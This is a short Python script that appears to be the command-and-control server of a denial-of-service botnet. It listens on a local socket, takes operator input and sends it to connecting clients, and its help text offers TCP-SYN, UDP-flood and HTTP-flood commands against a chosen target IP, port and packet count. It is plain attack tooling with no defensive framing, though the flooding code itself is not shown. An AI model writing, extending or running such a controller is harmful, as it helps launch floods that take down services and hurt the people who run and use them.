import socket

def send_response(message, client):
    data = "{:<64}".format(message)
    client.send(data.encode("utf-8"))

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind(("localhost", 9001))

server.listen(1000)
print("Enter the commands here, type h to see view the commands:")
while True:
    message = input(">>> ")
    if(message == "h" or message == "help"):
        print("""These are the commands that can be used: 
        SEND TCP-SYN <TARGET-IP> <PORT NUMBER> <NUMBER OF PACKETS>
        SEND UDP-FLOOD <TARGET-IP> <PORT NUMBER> <NUMBER OF PACKETS>
        SEND HTTP-FLOOD <TARGET-IP> <PORT NUMBER> <NUMBER OF PACKETS>
        STOP ATTACK - TO STOP ATTACK
        """)
        continue
    elif(message == "STOP ATTACK" or message == "STOP attack"):
        print("You have ended the attack!")
        break    
    else:
        (client, address) = server.accept()
        send_response(message, client)
        client.close()

    
